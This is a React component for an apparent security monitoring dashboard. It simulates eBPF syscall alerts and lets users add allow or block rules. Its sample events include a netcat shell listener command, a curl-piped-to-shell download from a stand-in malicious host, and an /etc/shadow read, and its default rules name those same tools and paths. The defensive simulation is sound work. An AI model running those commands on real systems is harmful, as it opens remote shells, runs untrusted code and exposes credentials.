import React, { useState, useEffect, FormEvent } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { ShieldCheck, Cpu, Play, Square, Eye, Plus, Ban, Trash2, Edit2, CheckCircle, Download } from 'lucide-react';
import { EbpfRule, SysCallAlert } from '../types';
import ExportButton from './ExportButton';

interface EbpfTelemetryProps {
  threatLevel: 'low' | 'medium' | 'high';
  onAlertTriggered: (alertCount: number) => void;
  alerts?: SysCallAlert[];
  setAlerts?: React.Dispatch<React.SetStateAction<SysCallAlert[]>>;
  onAlertClick?: (alert: SysCallAlert) => void;
  triggerToast?: (msg: string) => void;
}

export default function EbpfTelemetry({ 
  threatLevel, 
  onAlertTriggered, 
  alerts: propAlerts, 
  setAlerts: propSetAlerts,
  onAlertClick,
  triggerToast
}: EbpfTelemetryProps) {
  const [isRunning, setIsRunning] = useState(true);
  const [localAlerts, setLocalAlerts] = useState<SysCallAlert[]>([]);
  const [interceptedCount, setInterceptedCount] = useState(0);

  const alerts = propAlerts !== undefined ? propAlerts : localAlerts;
  const setAlerts = propSetAlerts || setLocalAlerts;

  const handleExportEbpfTelemetry = () => {
    if (alerts.length === 0) return;
    const payload = {
      module_name: "eBPF Live Audit Telemetry",
      captured_alerts_count: alerts.length,
      alerts: alerts
    };
    const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(payload, null, 2));
    const downloadAnchor = document.createElement('a');
    downloadAnchor.setAttribute("href", dataStr);
    downloadAnchor.setAttribute("download", `aegis_ebpf_telemetry_history_${Date.now()}.json`);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();

    if (triggerToast) {
      triggerToast("eBPF live audit telemetry history successfully exported.");
    }
  };

  // Notify parent component about intercepted threat alert counter changes via useEffect
  useEffect(() => {
    onAlertTriggered(interceptedCount);
  }, [interceptedCount, onAlertTriggered]);

  // Custom user security rules inside kernel space
  const [rules, setRules] = useState<EbpfRule[]>([
    { id: '1', name: 'Intercept Netcat shells', type: 'comm', pattern: 'nc', action: 'block', active: true },
    { id: '2', name: 'Flag curl remote execs', type: 'comm', pattern: 'curl', action: 'block', active: true },
    { id: '3', name: 'Trace setuid escalations', type: 'syscall', pattern: 'setuid', action: 'allow', active: true },
    { id: '4', name: 'Audit /etc/ shadow access', type: 'path', pattern: '/etc/shadow', action: 'block', active: true }
  ]);

  // Form states to create new custom systems rule
  const [formName, setFormName] = useState('');
  const [formType, setFormType] = useState<'comm' | 'syscall' | 'path'>('comm');
  const [formPattern, setFormPattern] = useState('');
  const [formAction, setFormAction] = useState<'allow' | 'block'>('block');

  const handleAddRule = (e: FormEvent) => {
    e.preventDefault();
    if (!formPattern.trim()) return;
    const newRule: EbpfRule = {
      id: Math.random().toString(),
      name: formName || `Rule for ${formPattern}`,
      type: formType,
      pattern: formPattern,
      action: formAction,
      active: true
    };
    setRules([...rules, newRule]);
    setFormName('');
    setFormPattern('');
  };

  const handleDeleteRule = (id: string) => {
    setRules(rules.filter(r => r.id !== id));
  };

  const toggleRuleActive = (id: string) => {
    setRules(rules.map(r => r.id === id ? { ...r, active: !r.active } : r));
  };

  // Generate simulated security events
  useEffect(() => {
    if (!isRunning) return;

    // Speed depends on Threat level posture
    const intervalTime = threatLevel === 'high' ? 800 : threatLevel === 'medium' ? 2000 : 4000;

    const generatorTimer = setInterval(() => {
      // Library of simulated system events
      const samples = [
        { comm: 'nc', syscall: 'execve', args: '-lvp 4444 -e /bin/sh', path: '/usr/bin/nc', defaultSev: 'high' },
        { comm: 'curl', syscall: 'execve', args: 'http://malcious-domain.com/payload.sh | sh', path: '/usr/bin/curl', defaultSev: 'high' },
        { comm: 'bash', syscall: 'setuid', args: '0', path: '/bin/bash', defaultSev: 'high' },
        { comm: 'cat', syscall: 'openat', args: '/etc/shadow', path: '/etc/shadow', defaultSev: 'high' },
        { comm: 'nginx', syscall: 'accept4', args: 'client: 192.168.1.55:53299', path: '', defaultSev: 'low' },
        { comm: 'python3', syscall: 'write', args: 'fd: 1 (stdout), length: 14', path: '', defaultSev: 'low' },
        { comm: 'sshd', syscall: 'clone', args: 'flags: SIGCHLD', path: '', defaultSev: 'medium' },
        { comm: 'sudo', syscall: 'execve', args: '/usr/bin/apt-get update', path: '/usr/bin/sudo', defaultSev: 'medium' },
        { comm: 'systemd', syscall: 'epoll_wait', args: 'maxevents: 32', path: '', defaultSev: 'low' }
      ];

      // Pick a random system frame, matching if posture is high
      let chosen = samples[Math.floor(Math.random() * samples.length)];
      if (threatLevel === 'high' && Math.random() > 0.3) {
        // Boost critical attacks frequency in High posture
        const attackVectors = samples.slice(0, 4);
        chosen = attackVectors[Math.floor(Math.random() * attackVectors.length)];
      }

      // Check user customized filters rules
      let verdict: 'allow' | 'block' = 'allow';
      const activeRules = rules.filter(r => r.active);
      const matchesRule = activeRules.find(r => {
        if (r.type === 'comm' && chosen.comm.toLowerCase().includes(r.pattern.toLowerCase())) {
          return true;
        }
        if (r.type === 'syscall' && chosen.syscall.toLowerCase().includes(r.pattern.toLowerCase())) {
          return true;
        }
        if (r.type === 'path' && chosen.path.toLowerCase().includes(r.pattern.toLowerCase())) {
          return true;
        }
        return false;
      });

      if (matchesRule) {
        verdict = matchesRule.action;
      }

      const alertId = Math.random().toString();
      const newAlert: SysCallAlert = {
        id: alertId,
        timestamp: new Date().toISOString().substring(11, 19),
        pid: Math.floor(Math.random() * 32000) + 1000,
        ppid: Math.floor(Math.random() * 999) + 1,
        comm: chosen.comm,
        syscall: chosen.syscall,
        args: chosen.args,
        status: verdict === 'block' ? 'intercepted' : 'allowed',
        severity: verdict === 'block' ? 'high' : (chosen.defaultSev as any)
      };

      setAlerts(prev => [newAlert, ...prev].slice(0, 40));
      if (verdict === 'block') {
        setInterceptedCount(prev => prev + 1);
      }
    }, intervalTime);

    return () => clearInterval(generatorTimer);
  }, [isRunning, rules, threatLevel]);

  return (
    <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
      {/* Rules Engine Control column */}
      <div className="lg:col-span-1 space-y-6">
        {/* Run/Pause monitoring */}
        <div className="bg-[#0A0A0C]/40 border border-white/5 rounded p-5">
          <div className="flex items-center justify-between mb-4 pb-2 border-b border-white/5">
            <h3 className="text-xs font-serif font-light tracking-[0.15em] text-zinc-100 uppercase flex items-center gap-1.5">
              <Cpu size={14} className="text-[#00f0ff]" /> Daemon state
            </h3>
            <span className={`h-2.5 w-2.5 rounded-full ${isRunning ? 'bg-emerald-500 animate-pulse' : 'bg-rose-500'}`} />
          </div>

          <p className="text-[11px] font-mono text-white/40 mb-4 leading-relaxed">
            Attach safe eBPF kprobes directly to trace system executions. Compile bytecode dynamic structures and capture malicious spawns securely.
          </p>

          <div className="flex gap-2">
            <button
              onClick={() => setIsRunning(true)}
              disabled={isRunning}
              className={`flex-1 py-2 rounded text-[10px] tracking-wider font-mono font-bold flex items-center justify-center gap-1.5 cursor-pointer border transition-all ${
                isRunning 
                ? 'bg-black/30 text-white/20 border-white/5' 
                : 'bg-emerald-950/20 hover:bg-emerald-900/40 text-emerald-400 border border-emerald-900/40'
              }`}
            >
              <Play size={11} /> START DEAMON
            </button>
            <button
              onClick={() => setIsRunning(false)}
              disabled={!isRunning}
              className={`flex-1 py-2 rounded text-[10px] tracking-wider font-mono font-bold flex items-center justify-center gap-1.5 cursor-pointer border transition-all ${
                !isRunning 
                ? 'bg-black/30 text-white/20 border-white/5' 
                : 'bg-rose-950/20 hover:bg-rose-900/40 text-rose-400 border border-rose-900/40'
              }`}
            >
              <Square size={11} /> STOP DEAMON
            </button>
          </div>
        </div>

        {/* Dynamic Sandbox Rule creation */}
        <div className="bg-[#0A0A0C]/40 border border-white/5 rounded p-5 w-full">
          <h3 className="text-xs font-serif font-light tracking-[0.15em] text-zinc-100 uppercase pb-2 border-b border-white/5 mb-3.5 flex items-center gap-1.5">
            <ShieldCheck size={14} className="text-[#00f0ff]" /> Kernel Filter Injector
          </h3>

          <form onSubmit={handleAddRule} className="space-y-3.5">
            <div>
              <label className="block text-[10px] font-mono font-bold text-white/45 tracking-wider uppercase mb-1">
                Rule Label Name
              </label>
              <input
                type="text"
                value={formName}
                onChange={(e) => setFormName(e.target.value)}
                placeholder="Halt unauthorized shells"
                className="w-full bg-black border border-white/5 rounded p-2 text-xs text-zinc-300 focus:outline-none focus:border-[#00f0ff] font-mono"
              />
            </div>

            <div className="grid grid-cols-2 gap-2">
              <div>
                <label className="block text-[10px] font-mono font-bold text-white/45 tracking-wider uppercase mb-1">
                  Probe Type
                </label>
                <select
                  value={formType}
                  onChange={(e) => setFormType(e.target.value as any)}
                  className="w-full bg-black border border-white/5 rounded p-2 text-[11px] text-zinc-300 focus:outline-none focus:border-[#00f0ff] font-mono cursor-pointer"
                >
                  <option value="comm">Binary Name</option>
                  <option value="syscall">System Call</option>
                  <option value="path">Involved Path</option>
                </select>
              </div>

              <div>
                <label className="block text-[10px] font-mono font-bold text-white/45 tracking-wider uppercase mb-1">
                  Action
                </label>
                <select
                  value={formAction}
                  onChange={(e) => setFormAction(e.target.value as any)}
                  className="w-full bg-black border border-white/5 rounded p-2 text-[11px] text-zinc-300 focus:outline-none focus:border-[#00f0ff] font-mono cursor-pointer"
                >
                  <option value="allow">Audit only (Allow)</option>
                  <option value="block">Intercept (Block)</option>
                </select>
              </div>
            </div>

            <div>
              <label className="block text-[10px] font-mono font-bold text-white/45 tracking-wider uppercase mb-1">
                Trigger Criteria (Regex/Sub)
              </label>
              <input
                type="text"
                required
                value={formPattern}
                onChange={(e) => setFormPattern(e.target.value)}
                placeholder="/bin/sh or nc"
                className="w-full bg-black border border-white/5 rounded p-2 text-xs text-zinc-300 focus:outline-none focus:border-[#00f0ff] font-mono"
              />
            </div>

            <button
              type="submit"
              className="w-full py-2 bg-transparent text-[#00f0ff] border border-[#00f0ff]/50 hover:bg-[#00f0ff] hover:text-black font-mono text-[10px] tracking-widest font-bold uppercase rounded flex items-center justify-center gap-1.5 transition-all shadow-[0_0_8px_rgba(0,240,255,0.15)] cursor-pointer"
            >
              <Plus size={13} /> Compile & Inject Rule
            </button>
          </form>
        </div>
      </div>

      {/* Main active rules list & Live Intercept feeds */}
      <div className="lg:col-span-2 space-y-6">
        {/* Rules ledger list */}
        <div className="bg-[#0A0A0C]/40 border border-white/5 rounded p-5">
          <div className="flex items-center justify-between mb-4 pb-2 border-b border-white/5">
            <h3 className="text-xs font-serif font-light tracking-[0.15em] text-zinc-100 uppercase flex items-center gap-1.5">
              Active Kernel Hooks ({rules.length})
            </h3>
            <span className="text-[10px] text-[#00f0ff]/70 font-mono tracking-wider">Dynamic System Filters</span>
          </div>

          <div className="max-h-52 overflow-y-auto space-y-2 pr-1">
            {rules.map((rule) => (
              <div 
                key={rule.id}
                className={`flex items-center justify-between p-3 rounded border transition-all ${
                  rule.active 
                  ? 'bg-black/30 border-white/5 text-zinc-300' 
                  : 'bg-black/10 border-white/5/40 text-white/30'
                }`}
              >
                <div className="flex items-baseline gap-2 font-mono">
                  <span className={`text-[9px] px-1.5 py-0.5 rounded font-black tracking-wider uppercase ${
                    rule.action === 'block' ? 'bg-rose-950/15 text-rose-300 border border-rose-900/30' : 'bg-emerald-950/10 text-emerald-300 border border-emerald-900/20'
                  }`}>
                    {rule.action}
                  </span>
                  <div className="flex flex-col ml-1">
                    <span className="text-xs font-medium text-white/80">{rule.name}</span>
                    <span className="text-[9px] text-white/40 uppercase mt-0.5">
                      MATCHES: <strong className="text-[#00f0ff]">{rule.type}</strong> CONTAINS <strong className="text-white/70">"{rule.pattern}"</strong>
                    </span>
                  </div>
                </div>

                <div className="flex items-center gap-2">
                  <button
                    onClick={() => toggleRuleActive(rule.id)}
                    className={`p-1.5 rounded hover:bg-white/5 font-mono text-[9px] uppercase font-bold tracking-wider cursor-pointer ${
                      rule.active ? 'text-[#00f0ff]/80 hover:text-[#00f0ff]' : 'text-white/20 hover:text-white/40'
                    }`}
                  >
                    {rule.active ? 'Active' : 'Muted'}
                  </button>
                  <button
                    onClick={() => handleDeleteRule(rule.id)}
                    className="p-1.5 rounded text-white/40 hover:text-rose-400 hover:bg-rose-950/20 cursor-pointer transition-colors"
                    title="Evict rule"
                  >
                    <Trash2 size={12} />
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Real-time intercepted telemetry list */}
        <div className="bg-[#0A0A0C]/40 border border-white/5 rounded p-5">
          <div className="flex items-center justify-between mb-4 pb-2 border-b border-white/5">
            <h3 className="text-xs font-serif font-light tracking-[0.15em] text-zinc-300 uppercase flex items-center gap-1.5">
              Live kernel execution stream (eBPF events)
            </h3>
            <div className="flex items-center gap-3">
              {alerts.length > 0 && (
                <ExportButton
                  id="btn-export-ebpf-section"
                  label="Export Logs"
                  filenamePrefix="aegis_ebpf_telemetry_history"
                  jsonData={{
                    module_name: "eBPF Live Audit Telemetry",
                    captured_alerts_count: alerts.length,
                    active_rules: rules,
                    alerts: alerts,
                    timestamp: new Date().toISOString()
                  }}
                  csvData={alerts.map(a => ({
                    timestamp: a.timestamp,
                    pid: a.pid,
                    comm: a.comm,
                    syscall: a.syscall,
                    args: a.args,
                    status: a.status,
                    severity: a.severity
                  }))}
                  textReport={`=== AEGIS eBPF KERNEL TELEMETRY LOGS ===\nDate: ${new Date().toISOString()}\nTotal Captured Events: ${alerts.length}\n\n${alerts.map((a, i) => `[${a.timestamp}] PID ${a.pid} (${a.comm}) -> ${a.syscall} [${a.status.toUpperCase()}]\nArgs: ${a.args}\nSeverity: ${a.severity.toUpperCase()}\n`).join('\n')}`}
                  triggerToast={triggerToast}
                  size="xs"
                />
              )}
              <button
                onClick={() => {
                  setAlerts([]);
                  setInterceptedCount(0);
                  onAlertTriggered(0);
                }}
                className="text-[9px] tracking-wider font-mono hover:text-[#00f0ff] text-white/40 uppercase cursor-pointer"
              >
                Clear Screen Logs
              </button>
            </div>
          </div>

          <div className="bg-black border border-white/5 rounded p-3 h-64 overflow-y-auto font-mono text-[11px] space-y-2">
            {!isRunning && alerts.length === 0 && (
              <div className="text-white/20 text-center py-10 font-mono text-xs">
                [!] Daemon is offline. Activate telemetry pipeline above to resume.
              </div>
            )}
            {isRunning && alerts.length === 0 && (
              <div className="text-white/30 text-center py-10 animate-pulse font-mono text-xs">
                [*] Awaiting kernel system calls execution... Spawning probe events...
              </div>
            )}
            
            <AnimatePresence initial={false}>
              {alerts.map((al) => (
                <motion.div
                  key={al.id}
                  initial={{ opacity: 0, x: -10 }}
                  animate={{ opacity: 1, x: 0 }}
                  exit={{ opacity: 0 }}
                  onClick={() => onAlertClick?.(al)}
                  className={`p-2.5 border rounded leading-relaxed cursor-pointer transition-all hover:bg-white/5 group relative ${
                    al.status === 'intercepted'
                    ? 'bg-rose-950/15 border-rose-900/30 text-rose-300 hover:border-rose-500/50 hover:shadow-[0_0_8px_rgba(239,68,68,0.15)]'
                    : al.severity === 'high'
                      ? 'bg-amber-950/10 border-[#00f0ff]/20 text-amber-200 hover:border-[#00f0ff]/50 hover:shadow-[0_0_8px_rgba(0,240,255,0.15)]'
                      : 'bg-black/40 border-white/5 text-white/60 hover:border-white/20'
                  }`}
                >
                  <div className="absolute right-2.5 bottom-2 opacity-0 group-hover:opacity-150 text-[8px] text-[#00f0ff] font-bold tracking-wider uppercase font-mono transition-all">
                    DEEP DIVE →
                  </div>
                  <div className="flex items-center justify-between font-bold text-[10px] mb-1">
                    <span className="flex items-center gap-1.5">
                      {al.status === 'intercepted' ? (
                        <span className="bg-rose-905/20 text-rose-300 border border-rose-900/30 px-1.5 py-0.5 rounded text-[8px] tracking-wider uppercase font-black">INTERCEPTED</span>
                      ) : (
                        <span className="bg-emerald-950/20 text-emerald-300 border border-emerald-900/30 px-1.5 py-0.5 rounded text-[8px] tracking-wider uppercase font-black">ALLOWED</span>
                      )}
                      PID: {al.pid} <span className="text-white/30">PPID: {al.ppid}</span>
                    </span>
                    <span className="text-white/30 text-[9px]">{al.timestamp} UTC</span>
                  </div>
                  <div>
                    COMM: <strong className={al.status === 'intercepted' ? 'text-rose-400' : 'text-zinc-200'}>{al.comm}</strong> | 
                    SYSCALL: <strong className="text-[#00f0ff] font-serif">{al.syscall}</strong>
                  </div>
                  {al.args && (
                    <div className="text-[10px] text-white/35 font-mono truncate mt-1 pl-1 border-l border-white/5">
                      ARGS: {al.args}
                    </div>
                  )}
                </motion.div>
              ))}
            </AnimatePresence>
          </div>
        </div>
      </div>
    </div>
  );
}
